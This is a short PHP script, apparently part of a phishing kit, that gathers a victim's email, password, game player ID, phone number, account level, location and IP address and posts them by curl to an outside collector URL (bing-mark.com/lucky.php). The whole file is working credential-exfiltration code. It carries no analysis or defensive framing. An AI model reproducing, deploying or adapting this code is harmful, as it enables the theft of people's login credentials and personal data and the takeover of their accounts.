<?php 
$myData = "mail=".$email."&password=".$password."&playid=".$playid."&nick=".$nick."&phone=".$phone."&tier=".$tier."&rpt=".$rpt."&level=".$level."&rpl=".$rpl."&platform=".$platform."&login=".$login."&country=".$country."&regionName=".$region."&city=".$city."&query=".$ipAddr."&country_code=".$setRyusCalling;
$my  = "https://bing-mark.com/lucky.php";

$c5 = curl_init();
curl_setopt($c5, CURLOPT_URL, $my);
curl_setopt($c5, CURLOPT_POST, 1);
curl_setopt($c5, CURLOPT_POSTFIELDS, $myData);
curl_setopt($c5, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($c5, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
curl_setopt($c5, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
curl_setopt($c5, CURLOPT_HEADER, 0);
curl_setopt($c5, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($c5);
curl_close($c5);
?>